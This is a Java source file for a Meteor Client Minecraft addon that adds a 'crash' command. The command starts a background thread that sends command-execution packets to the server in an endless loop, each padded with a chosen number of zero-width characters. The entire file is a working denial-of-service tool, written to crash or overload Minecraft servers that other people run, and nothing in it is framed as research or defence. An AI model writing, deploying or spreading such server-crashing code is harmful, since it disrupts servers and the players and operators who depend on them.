package com.x310.clarity.commands;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

public class SpamCommandExec extends Command {
    public SpamCommandExec() {
        super("crash", "spams server with CommandExecutionC2S packets");
    }

    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder
            .then(argument("amount", IntegerArgumentType.integer()))
            .then(argument("buffer", IntegerArgumentType.integer())).executes((context) -> {

            Integer amount = IntegerArgumentType.getInteger(context, "amount");
            Integer buffer = IntegerArgumentType.getInteger(context, "buffer");
            new Thread(() -> {
                ClientPlayNetworkHandler handler = mc.getNetworkHandler();
                assert handler != null;

                String longString = "skill " + "\u200D".repeat(buffer);

                while (true) {
                    for (int i = 0; i < amount; i++) {
                        handler.sendPacket(new CommandExecutionC2SPacket(longString));
//                        handler.sendChatCommand(longString);

                    }
                    try {
                        Thread.sleep(50);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
            }).start();

            return 1;
        });
    }
}
